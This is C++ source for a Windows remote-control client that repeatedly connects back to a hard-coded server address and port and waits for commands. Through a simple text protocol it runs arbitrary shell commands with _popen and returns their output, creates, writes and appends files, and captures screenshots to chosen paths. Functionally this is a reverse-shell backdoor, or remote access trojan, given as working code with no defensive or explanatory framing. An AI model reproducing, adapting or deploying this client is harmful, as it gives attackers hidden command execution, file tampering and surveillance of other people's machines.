#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include "customtools.h"

WSADATA Winsockdata;
int     iWsaStartup;
int     iWsaCleanup;

SOCKET  TCPClientSocket;
int     iTCPClientStart;
int     iCloseSocket;

struct  sockaddr_in TCPServerAdd;

int     iConnect;

int     iRecv;
bool    ErrorInSendMessage = false;

char    ipAddr[32] = "127.0.0.1";
int     port = 8000;

bool    Connected = false;


// Functions
void TCPClientStart();
void Connect();
void SendMsg(std::string msg);
void Send(std::string msg);
void CloseSocket();
void UDF_WSACleanup();

void exec(std::string command);

std::string ReceiveMsg();
std::string CommandsHandler(std::string);

int main() {
	while (true) {
		TCPClientStart();
		if (iTCPClientStart == 0) {
			while (true) {
				if (iTCPClientStart == 0) {
					Connect();
					if (iConnect != INVALID_SOCKET) {

						Connected = true;

						while (Connected) {
							std::string message = ReceiveMsg();

							if (iRecv != SOCKET_ERROR) SendMsg(CommandsHandler(message));
							else Connected = false;
						}
					}
				}
				CloseSocket();
				UDF_WSACleanup();

				Sleep(5000);
				TCPClientStart();
			}
		}
		Sleep(5000);
	}
	return 0;
}


// CommandsHandler
std::string CommandsHandler(std::string msg) {

	// "help" command
	if (msg.find("help") == 0) {
		std::string help = "Help Commands:\n\t";
		help.append("help\n\t");
		help.append("exec [Command]\n\t");
		help.append("CreateFile [FileName] in [Directory]\n\t");
		help.append("Screenshot [FileName] in [Directory]\n\t");
		return help;
	}

	// "CreateFile" command
	else if (msg.find("CreateFile") == 0) {

		if (msg.find(" ") == 10) {
			int splitPoint = msg.find(" in ");
			if (splitPoint == std::string::npos) return "Invalid Syntax";

			std::string fileName = split(msg, 11, splitPoint);
			splitPoint += 4;
			if (splitPoint >= msg.length()) return "Invalid Syntax";

			std::string loc = split(msg, splitPoint, msg.length());
			std::string path = loc;
			path.append(fileName);

			std::ofstream file(path);
			if (file.is_open()) {
				file.close();
				return "File created at " + path;
			}
			else return "Failed to create file! Please check the path you entered";
		}
		else return "Invalid Syntax";
	}

	else if (msg.find("WriteFile") == 0) {

		if (msg.find(" ") == 9) {
			int splitPoint = msg.find(" ~> ");
			if (splitPoint == std::string::npos) return "Invalid Syntax";

			std::string filename = split(msg, 10, splitPoint);
			splitPoint += 4;
			if (splitPoint >= msg.length()) return "Invalid Syntax";

			std::string text = split(msg, splitPoint, msg.length());

			std::ofstream outfile;
			outfile.open(filename);

			outfile << text;
			if (outfile.is_open()) {
				outfile.close();
				return "Done! ";
			}
			else return "Failed to write file! Please check the file name you entered";
		}
		else return "Invalid Syntax";
	}

	else if (msg.find("AppendFile") == 0) {

		if (msg.find(" ") == 10) {
			int splitPoint = msg.find(" ~> ");
			if (splitPoint == std::string::npos) return "Invalid Syntax";

			std::string filename = split(msg, 11, splitPoint);
			splitPoint += 4;
			if (splitPoint >= msg.length()) return "Invalid Syntax";

			std::string text = split(msg, splitPoint, msg.length());

			std::ofstream outfile;
			outfile.open(filename, std::ofstream::app);

			outfile << text;
			if (outfile.is_open()) {
				outfile.close();
				return "Done! ";
			}
			else return "Failed to append file! Please check the file name you entered";
		}
		else return "Invalid Syntax";
	}

	// "Screenshot" command
	else if (msg.find("Screenshot") == 0) {
		if (msg.find(" ") == 10) {
			int splitPoint = msg.find(" in ");
			if (splitPoint == std::string::npos) return "Invalid Syntax";

			std::string fileName = split(msg, 11, splitPoint);
			splitPoint += 4;
			if (splitPoint >= msg.length()) return "Invalid Syntax";

			std::string path = split(msg, splitPoint, msg.length());
			path.append(fileName);
			TakeScreenShot(path);

			return "Screenshot saved at \"" + path + "\"";
		}
		else return "Invalid Syntax";
	}

	else if (msg.find("exec") == 0) {
		if (msg.find(" ") == 4) {
			std::string cmd = split(msg, 5, msg.length());
			exec(cmd);
			return "";
		}
	}


	else {
		return "Command not found! Use \"help\" to get list of commands available";
	}

}


// Useful fucntions
void exec(std::string command) {
	char buffer[128];
	std::string result;
	FILE* pipe = _popen(command.c_str(), "r");

	if (!pipe) {
		SendMsg("_popen failed!");
	}

	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe) != NULL) {
			Send(buffer);
		}
	}
	_pclose(pipe);
}


// TCP Socket etc
void TCPClientStart() {
	iWsaStartup = WSAStartup(MAKEWORD(2, 2), &Winsockdata);
	if (iWsaStartup != 0) {
		std::cout << "WSAStartUp Failed!" << std::endl;
	}
	else {
		std::cout << "WSAStartUp Success!" << std::endl;

		TCPServerAdd.sin_family = AF_INET;
		TCPServerAdd.sin_addr.s_addr = inet_addr(ipAddr);
		TCPServerAdd.sin_port = htons(port);

		TCPClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (TCPClientSocket == INVALID_SOCKET) std::cout << "TCP Client Socket Creation Failed!" << WSAGetLastError() << std::endl;
		else {
			std::cout << "TCP Client Socket Creation Success!" << std::endl;
			iTCPClientStart = 0;
		}
	}
}

void Connect() {
	iConnect = connect(TCPClientSocket, (SOCKADDR*)&TCPServerAdd, sizeof(TCPServerAdd));
	if (iConnect == INVALID_SOCKET) std::cout << "Connection Failed! Error no: " << WSAGetLastError() << std::endl;
	else std::cout << "Connected to Server!" << std::endl;
}

void SendMsg(std::string msg) {
	char SenderBuffer;

	msg += (char)3;
	msg += (char)3;
	msg += (char)3;

	for (int i = 0; i < msg.size(); i++) {
		SenderBuffer = msg.at(i);
		if (send(TCPClientSocket, &SenderBuffer, sizeof(SenderBuffer), 0) == SOCKET_ERROR) {
			ErrorInSendMessage = true;
			break;
		}
	}

	if (ErrorInSendMessage) {
		std::cout << "An error occurred while sending message to client! Error no: " << WSAGetLastError() << std::endl;
	}
	else {
		std::cout << "Message was sent successfuly!" << std::endl;
	}
}

void Send(std::string msg) {
	char SenderBuffer;

	for (int i = 0; i < msg.size(); i++) {
		SenderBuffer = msg.at(i);
		if (send(TCPClientSocket, &SenderBuffer, sizeof(SenderBuffer), 0) == SOCKET_ERROR) {
			ErrorInSendMessage = true;
			break;
		}
	}

	if (ErrorInSendMessage) {
		std::cout << "An error occurred while sending message to client! Error no: " << WSAGetLastError() << std::endl;
	}
	else {
		std::cout << "Message was sent successfuly!" << std::endl;
	}
}

std::string ReceiveMsg() {
	char    RecvBuffer;
	int     iRecvBuffer = sizeof(RecvBuffer);
	int     checks = 0;

	std::string msg;
	std::string tmp;

	std::cout << "Waiting for commands... " << std::endl;
	while (true) {
		iRecv = recv(TCPClientSocket, &RecvBuffer, iRecvBuffer, 0);
		if (iRecv == SOCKET_ERROR) {
			std::cout << std::endl << "Receive Data Failed! Error no: " << WSAGetLastError() << std::endl;
			break;
		}
		else {
			if ((RecvBuffer == (char)3) && checks == 0) {
				checks = 1;
				tmp += RecvBuffer;
			}
			else if ((RecvBuffer == (char)3) && checks == 1) {
				checks = 2;
				tmp += RecvBuffer;
			}
			else if ((RecvBuffer == (char)3) && checks == 2) {
				checks = 3;
				break;
			}
			else {
				checks = 0;
				msg.append(tmp);
				msg += RecvBuffer;
				tmp = "";
			}
		}
	}
	return msg;
}

void CloseSocket() {
	iCloseSocket = closesocket(TCPClientSocket);
	if (iCloseSocket == SOCKET_ERROR) std::cout << "Closing Socket Failed! Error no: " << WSAGetLastError() << std::endl;
	else std::cout << "Closing Socket Success!" << std::endl;
}

void UDF_WSACleanup() {
	iWsaCleanup = WSACleanup();
	if (iWsaCleanup == SOCKET_ERROR) std::cout << "Cleanup Func Failed! Error no: " << WSAGetLastError() << std::endl;
	else std::cout << "WSACleanup Func Success!" << std::endl;
}